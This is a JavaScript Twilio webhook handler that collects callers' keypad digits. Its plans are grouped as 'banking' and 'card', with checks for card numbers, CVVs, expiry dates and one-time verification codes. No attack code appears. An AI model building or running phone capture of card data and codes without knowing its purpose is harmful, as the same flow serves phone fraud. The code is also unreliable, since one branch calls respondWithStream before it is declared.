'use strict';

function createTwilioGatherHandler(deps = {}) {
  const {
    warnOnInvalidTwilioSignature = () => {},
    requireTwilioSignature,
    getDigitService,
    digitService: staticDigitService,
    callConfigurations,
    config,
    VoiceResponse,
    webhookService,
    resolveHost,
    buildTwilioStreamTwiml,
    clearPendingDigitReprompts,
    callEndLocks,
    gatherEventDedupe,
    maskDigitsForLog = (input) => String(input || ''),
    callEndMessages = {},
    closingMessage = 'Thank you for your time. Goodbye.',
    queuePendingDigitAction,
    getTwilioTtsAudioUrl,
    shouldUseTwilioPlay,
    resolveTwilioSayVoice,
    isGroupedGatherPlan,
    ttsTimeoutMs
  } = deps;

  const getService = () => (typeof getDigitService === 'function' ? getDigitService() : staticDigitService);

  return async function twilioGatherHandler(req, res) {
    try {
      if (typeof requireTwilioSignature === 'function') {
        const ok = requireTwilioSignature(req, res, '/webhook/twilio-gather');
        if (!ok) return;
      } else {
        warnOnInvalidTwilioSignature(req, '/webhook/twilio-gather');
      }
      const digitService = getService();
      const { CallSid, Digits } = req.body || {};
      const callSid = req.query?.callSid || CallSid;
      const from = req.body?.From || req.body?.from || null;
      const to = req.body?.To || req.body?.to || null;
      if (!callSid) {
        return res.status(400).send('Missing CallSid');
      }
      console.log(`Gather webhook hit: callSid=${callSid} digits=${maskDigitsForLog(Digits || '')}`);

      let expectation = digitService?.getExpectation?.(callSid);
      if (!expectation && digitService?.getLockedGroup && digitService?.requestDigitCollectionPlan) {
        const callConfig = callConfigurations.get(callSid) || {};
        const groupId = digitService.getLockedGroup(callConfig);
        if (groupId) {
          await digitService.requestDigitCollectionPlan(callSid, {
            group_id: groupId,
            steps: [],
            end_call_on_success: true,
            capture_mode: 'ivr_gather',
            defer_twiml: true
          });
          expectation = digitService.getExpectation(callSid);
        }
      }
      if (!expectation) {
        console.warn(`Gather webhook had no expectation for ${callSid}`);
        const response = new VoiceResponse();
        response.say('We could not start digit capture. Goodbye.');
        response.hangup();
        res.type('text/xml');
        res.end(response.toString());
        return;
      }

      const host = resolveHost(req);
      const callConfig = callConfigurations.get(callSid) || {};
      const sayVoice = resolveTwilioSayVoice ? resolveTwilioSayVoice(callConfig) : null;
      const sayOptions = sayVoice ? { voice: sayVoice } : null;
      const playbackPlan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
      const isGroupedPlayback = typeof isGroupedGatherPlan === 'function'
        ? isGroupedGatherPlan(playbackPlan, callConfig)
        : Boolean(playbackPlan && ['banking', 'card'].includes(playbackPlan.group_id));
      const usePlayForGrouped = Boolean(
        isGroupedPlayback && typeof shouldUseTwilioPlay === 'function' && shouldUseTwilioPlay(callConfig)
      );
      const safeTtsTimeoutMs = Number.isFinite(Number(ttsTimeoutMs)) && Number(ttsTimeoutMs) > 0
        ? Number(ttsTimeoutMs)
        : 1200;
      const resolveTtsUrl = async (text) => {
        if (!usePlayForGrouped || !getTwilioTtsAudioUrl || !text) return null;
        if (!safeTtsTimeoutMs) {
          return getTwilioTtsAudioUrl(text, callConfig);
        }
        const timeoutPromise = new Promise((resolve) => {
          setTimeout(() => resolve(null), safeTtsTimeoutMs);
        });
        try {
          return await Promise.race([
            getTwilioTtsAudioUrl(text, callConfig),
            timeoutPromise
          ]);
        } catch (error) {
          console.error('Twilio TTS timeout fallback:', error);
          return null;
        }
      };
      const respondWithGather = async (exp, promptText = '', followupText = '', options = {}) => {
        try {
          const promptForDelay = promptText
            || exp?.prompt
            || (digitService?.buildDigitPrompt ? digitService.buildDigitPrompt(exp) : '');
          if (digitService?.markDigitPrompted && exp) {
            digitService.markDigitPrompted(callSid, null, 0, 'gather', {
              prompt_text: promptForDelay,
              reset_buffer: options.resetBuffer === true
            });
          }
          const promptUrl = await resolveTtsUrl(promptText);
          const followupUrl = await resolveTtsUrl(followupText);
          const twiml = digitService.buildTwilioGatherTwiml(
            callSid,
            exp,
            { prompt: promptText, followup: followupText, promptUrl, followupUrl, sayOptions },
            host
          );
          res.type('text/xml');
          res.end(twiml);
          return true;
        } catch (err) {
          console.error('Twilio gather build error:', err);
          return false;
        }
      };
      const resolveMaxRetries = (exp = {}, callConfig = {}) => {
        const candidates = [
          exp.max_retries,
          exp.collection_max_retries,
          exp.maxRetries,
          callConfig.collection_max_retries,
          callConfig.collectionMaxRetries
        ].map((value) => Number(value)).filter((value) => Number.isFinite(value));
        if (!candidates.length) return 2;
        return Math.max(0, Math.min(6, candidates[0]));
      };
      const triggerPressOneFallback = async (exp, reason = 'retry') => {
        if (!exp || exp.fallback_prompted) return false;
        exp.fallback_prompted = true;
        exp.fallback_mode = 'press1';
        exp.min_digits = 1;
        exp.max_digits = 1;
        exp.timeout_s = Math.min(Number(exp.timeout_s || 6), 8);
        if (digitService?.expectations?.set) {
          digitService.expectations.set(callSid, exp);
        }
        const fallbackPrompt = exp.fallback_prompt || 'If you still need help, press 1 now.';
        webhookService?.addLiveEvent?.(callSid, `📟 Fallback prompt (${reason})`, { force: true });
        return await respondWithGather(exp, fallbackPrompt, '', { resetBuffer: true });
      };
      const queryPlanId = req.query?.planId ? String(req.query.planId) : null;
      const queryStepIndex = Number.isFinite(Number(req.query?.stepIndex))
        ? Number(req.query.stepIndex)
        : null;
      const queryChannelSessionId = req.query?.channelSessionId
        ? String(req.query.channelSessionId)
        : null;
      const shouldResetOnInterrupt = (exp, reason = '') => {
        if (!exp) return false;
        if (exp.reset_on_interrupt === true) return true;
        const reasonCode = String(reason || '').toLowerCase();
        return [
          'spam_pattern',
          'too_long',
          'invalid_card_number',
          'invalid_cvv',
          'invalid_expiry_length'
        ].includes(reasonCode);
      };
      const currentExpectation = digitService?.getExpectation?.(callSid);
      if (currentExpectation && (queryPlanId || queryStepIndex || queryChannelSessionId)) {
        const missingPlan = queryPlanId && !currentExpectation.plan_id;
        const missingStep = Number.isFinite(queryStepIndex) && !Number.isFinite(currentExpectation.plan_step_index);
        const mismatchedPlan = queryPlanId && currentExpectation.plan_id && queryPlanId !== String(currentExpectation.plan_id);
        const mismatchedStep = Number.isFinite(queryStepIndex)
          && Number.isFinite(currentExpectation.plan_step_index)
          && queryStepIndex !== Number(currentExpectation.plan_step_index);
        const mismatchedChannelSession = queryChannelSessionId
          && currentExpectation.channel_session_id
          && queryChannelSessionId !== String(currentExpectation.channel_session_id);
        if (missingPlan || missingStep || mismatchedPlan || mismatchedStep || mismatchedChannelSession) {
          const prompt = currentExpectation.prompt || digitService.buildDigitPrompt(currentExpectation);
          console.warn(`Stale gather ignored for ${callSid} (plan=${queryPlanId || 'n/a'} step=${queryStepIndex ?? 'n/a'})`);
          if (await respondWithGather(currentExpectation, prompt)) {
            return;
          }
          respondWithStream();
          return;
        }
      }
      const respondWithStream = () => {
        const twiml = buildTwilioStreamTwiml(host, { callSid, from, to });
        res.type('text/xml');
        res.end(twiml);
      };
      const respondWithHangup = async (message) => {
        if (callEndLocks?.has(callSid)) {
          respondWithStream();
          return;
        }
        callEndLocks?.set(callSid, true);
        const response = new VoiceResponse();
        if (message) {
          if (usePlayForGrouped && getTwilioTtsAudioUrl) {
            const url = await resolveTtsUrl(message);
            if (url) {
              response.play(url);
            } else if (sayOptions) {
              response.say(sayOptions, message);
            } else {
              response.say(message);
            }
          } else if (sayOptions) {
            response.say(sayOptions, message);
          } else {
            response.say(message);
          }
        }
        response.hangup();
        res.type('text/xml');
        res.end(response.toString());
      };

      digitService?.clearDigitTimeout?.(callSid);

      const digits = String(Digits || '').trim();
      const stepTag = expectation?.plan_id ? `${expectation.plan_id}:${expectation.plan_step_index || 'na'}` : 'no_plan';
      const dedupeKey = digits
        ? `${callSid}:${stepTag}:${queryChannelSessionId || expectation?.channel_session_id || 'no_channel'}:${digits}`
        : null;
      if (dedupeKey) {
        const lastSeen = gatherEventDedupe?.get(dedupeKey);
        if (lastSeen && Date.now() - lastSeen < 2000) {
          console.warn(`Duplicate gather webhook ignored for ${callSid}`);
          const currentExpectation = digitService?.getExpectation?.(callSid);
          if (currentExpectation) {
            const prompt = currentExpectation.prompt || digitService.buildDigitPrompt(currentExpectation);
            if (await respondWithGather(currentExpectation, prompt)) {
              return;
            }
          }
          respondWithStream();
          return;
        }
        gatherEventDedupe?.set(dedupeKey, Date.now());
      }
      if (digits) {
        const expectation = digitService.getExpectation(callSid);
        if (expectation?.fallback_mode === 'press1') {
          const accepted = digits === '1';
          webhookService?.addLiveEvent?.(callSid, accepted ? '✅ Fallback confirmed' : '❌ Fallback rejected', { force: true });
          if (digitService?.clearDigitFallbackState) {
            digitService.clearDigitFallbackState(callSid);
          }
          if (digitService?.clearDigitPlan) {
            digitService.clearDigitPlan(callSid);
          }
          if (digitService?.setCaptureActive) {
            digitService.setCaptureActive(callSid, false, { reason: 'fallback_press1' });
          } else {
            callConfig.digit_capture_active = false;
            if (callConfig.call_mode === 'dtmf_capture') {
              callConfig.call_mode = 'normal';
            }
            callConfig.flow_state = 'normal';
            callConfig.flow_state_reason = 'fallback_press1';
            callConfig.flow_state_updated_at = new Date().toISOString();
            callConfigurations.set(callSid, callConfig);
          }
          if (accepted) {
            respondWithStream();
            return;
          }
          const failureMessage = expectation?.timeout_failure_message || callEndMessages.no_response;
          await respondWithHangup(failureMessage);
          return;
        }
        const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
        const hadPlan = !!expectation?.plan_id;
        const planEndOnSuccess = plan ? plan.end_call_on_success !== false : true;
        const planCompletionMessage = plan?.completion_message || '';
        const isGroupedPlan = typeof isGroupedGatherPlan === 'function'
          ? isGroupedGatherPlan(plan, callConfig)
          : Boolean(plan && ['banking', 'card'].includes(plan.group_id));
        const shouldEndOnSuccess = expectation?.end_call_on_success !== false;
        const display = expectation?.profile === 'verification'
          ? digitService.formatOtpForDisplay(digits, 'progress', expectation?.max_digits)
          : `Keypad (Gather): ${digits}`;
        webhookService?.addLiveEvent?.(callSid, `🔢 ${display}`, { force: true });
        const attemptId = expectation?.attempt_id || null;
        const collection = digitService.recordDigits(callSid, digits, {
          timestamp: Date.now(),
          source: 'gather',
          full_input: true,
          attempt_id: attemptId,
          plan_id: expectation?.plan_id || null,
          plan_step_index: expectation?.plan_step_index || null,
          channel_session_id: queryChannelSessionId || expectation?.channel_session_id || null
        });
        await digitService.handleCollectionResult(callSid, collection, null, 0, 'gather', { allowCallEnd: true, deferCallEnd: true });

        if (collection.accepted) {
          const nextExpectation = digitService.getExpectation(callSid);
          if (nextExpectation?.plan_id) {
            const stepPrompt = digitService.buildPlanStepPrompt
              ? digitService.buildPlanStepPrompt(nextExpectation)
              : (nextExpectation.prompt || digitService.buildDigitPrompt(nextExpectation));
            const nextPrompt = isGroupedPlan ? `Thanks. ${stepPrompt}` : stepPrompt;
            clearPendingDigitReprompts?.(callSid);
            digitService.clearDigitTimeout(callSid);
            digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: nextPrompt });
            if (await respondWithGather(nextExpectation, nextPrompt)) {
              return;
            }
          } else if (hadPlan) {
            clearPendingDigitReprompts?.(callSid);
            const profile = expectation?.profile || collection.profile;
            const completionMessage = planCompletionMessage
              || (digitService?.buildClosingMessage ? digitService.buildClosingMessage(profile) : closingMessage);
            if (planEndOnSuccess) {
              await respondWithHangup(completionMessage);
              return;
            }
          } else if (shouldEndOnSuccess) {
            clearPendingDigitReprompts?.(callSid);
            const profile = expectation?.profile || collection.profile;
            const completionMessage = digitService?.buildClosingMessage
              ? digitService.buildClosingMessage(profile)
              : closingMessage;
            await respondWithHangup(completionMessage);
            return;
          }

          queuePendingDigitAction?.(callSid, {
            type: 'reprompt',
            text: 'Thanks. One moment please.',
            scheduleTimeout: false
          });
          respondWithStream();
          return;
        }

        if (collection.fallback) {
          const failureMessage = expectation?.failure_message || callEndMessages.failure;
          clearPendingDigitReprompts?.(callSid);
          await respondWithHangup(failureMessage);
          return;
        }

        const attemptCount = collection.attempt_count || expectation?.attempt_count || collection.retries || 1;
        const maxRetries = resolveMaxRetries(expectation, callConfig);
        if (Number.isFinite(maxRetries) && attemptCount >= maxRetries) {
          if (await triggerPressOneFallback(expectation, 'max_retries')) {
            return;
          }
          const failureMessage = expectation?.failure_message || callEndMessages.failure || callEndMessages.no_response;
          await respondWithHangup(failureMessage);
          return;
        }
        let reprompt = digitService?.buildAdaptiveReprompt
          ? digitService.buildAdaptiveReprompt(expectation || {}, collection.reason, attemptCount)
          : '';
        if (!reprompt) {
          reprompt = expectation ? digitService.buildDigitPrompt(expectation) : 'Please enter the digits again.';
        }
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitTimeout(callSid);
        digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: reprompt });
        if (await respondWithGather(expectation, reprompt, '', {
          resetBuffer: shouldResetOnInterrupt(expectation, collection.reason)
        })) {
          return;
        }
        respondWithStream();
        return;
      }

      const plan = digitService?.getPlan ? digitService.getPlan(callSid) : null;
      const isGroupedPlan = typeof isGroupedGatherPlan === 'function'
        ? isGroupedGatherPlan(plan, callConfig)
        : Boolean(plan && ['banking', 'card'].includes(plan.group_id));
      if (isGroupedPlan) {
        const now = Date.now();
        const timeoutMs = Math.max(3000, (expectation?.timeout_s || 10) * 1000);
        const promptedAt = expectation?.prompted_at;
        const promptDelayMs = Number.isFinite(expectation?.prompted_delay_ms)
          ? expectation.prompted_delay_ms
          : 0;
        if (promptedAt) {
          const expectedTimeoutAt = promptedAt + promptDelayMs + timeoutMs;
          if (now + 250 < expectedTimeoutAt) {
            const prompt = digitService.buildPlanStepPrompt
              ? digitService.buildPlanStepPrompt(expectation)
              : (expectation.prompt || digitService.buildDigitPrompt(expectation));
            if (await respondWithGather(expectation, prompt, '', {
              resetBuffer: shouldResetOnInterrupt(expectation, 'timeout')
            })) {
              return;
            }
          }
        }
        const timeoutMessage = expectation.timeout_failure_message || callEndMessages.no_response;
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitFallbackState(callSid);
        digitService.clearDigitPlan(callSid);
        if (digitService?.updatePlanState) {
          digitService.updatePlanState(callSid, plan, 'FAIL', { step_index: expectation?.plan_step_index, reason: 'timeout' });
        }
        if (digitService?.setCaptureActive) {
          digitService.setCaptureActive(callSid, false, { reason: 'timeout' });
        } else {
          callConfig.digit_capture_active = false;
          if (callConfig.call_mode === 'dtmf_capture') {
            callConfig.call_mode = 'normal';
          }
          callConfig.flow_state = 'normal';
          callConfig.flow_state_reason = 'timeout';
          callConfig.flow_state_updated_at = new Date().toISOString();
          callConfigurations.set(callSid, callConfig);
        }
        await respondWithHangup(timeoutMessage);
        return;
      }

      expectation.retries = (expectation.retries || 0) + 1;
      digitService.expectations.set(callSid, expectation);

      const maxRetries = resolveMaxRetries(expectation, callConfig);
      if (Number.isFinite(maxRetries) && expectation.retries >= maxRetries) {
        if (await triggerPressOneFallback(expectation, 'timeout')) {
          return;
        }
        const timeoutMessage = expectation.timeout_failure_message || callEndMessages.no_response;
        clearPendingDigitReprompts?.(callSid);
        digitService.clearDigitFallbackState(callSid);
        digitService.clearDigitPlan(callSid);
        await respondWithHangup(timeoutMessage);
        return;
      }

      const timeoutPrompt = digitService?.buildTimeoutPrompt
        ? digitService.buildTimeoutPrompt(expectation, expectation.retries || 1)
        : (expectation.reprompt_timeout
          || expectation.reprompt_message
          || 'I did not receive any input. Please enter the code using your keypad.');
      clearPendingDigitReprompts?.(callSid);
      digitService.clearDigitTimeout(callSid);
      digitService.markDigitPrompted(callSid, null, 0, 'gather', { prompt_text: timeoutPrompt });
      if (await respondWithGather(expectation, timeoutPrompt, '', {
        resetBuffer: shouldResetOnInterrupt(expectation, 'timeout')
      })) {
        return;
      }
      respondWithStream();
    } catch (error) {
      console.error('Twilio gather webhook error:', error);
      res.status(500).send('Error');
    }
  };
}

module.exports = { createTwilioGatherHandler };
